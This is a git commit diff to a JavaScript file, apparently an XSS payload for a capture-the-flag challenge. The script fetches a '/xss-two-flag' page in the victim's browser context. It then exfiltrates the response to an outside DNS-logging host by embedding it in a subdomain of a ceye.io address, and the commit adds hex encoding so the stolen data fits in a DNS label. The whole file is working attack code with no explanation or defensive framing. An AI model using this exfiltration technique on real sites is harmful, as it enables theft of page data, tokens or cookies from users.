a202fce2ef7c776a604e219a41d2c4d476cd3dcd
youremailaddress <52492562+youremailaddress@users.noreply.github.com>
2022-06-05 20:49:27 +0800

    Update test.js

--- script/test.js
+++ script/test.js
@@ -2,5 +2,15 @@ var xhr = new XMLHttpRequest();
 xhr.open("GET", "/xss-two-flag", false);
 xhr.send(null);
 var xhr1 = new XMLHttpRequest();
-xhr1.open("GET","https://"+xhr.response+".my58ld.ceye.io/",false);
+function stringToHex(str){
+var val="";
+for(var i = 0; i < str.length; i++){
+if(val == "")
+val = str.charCodeAt(i).toString(16);
+else
+val +=str.charCodeAt(i).toString(16);
+}
+return val;
+}
+xhr1.open("GET","https://"+stringToHex(xhr.response)+".my58ld.ceye.io/",false);
 xhr1.send(null);
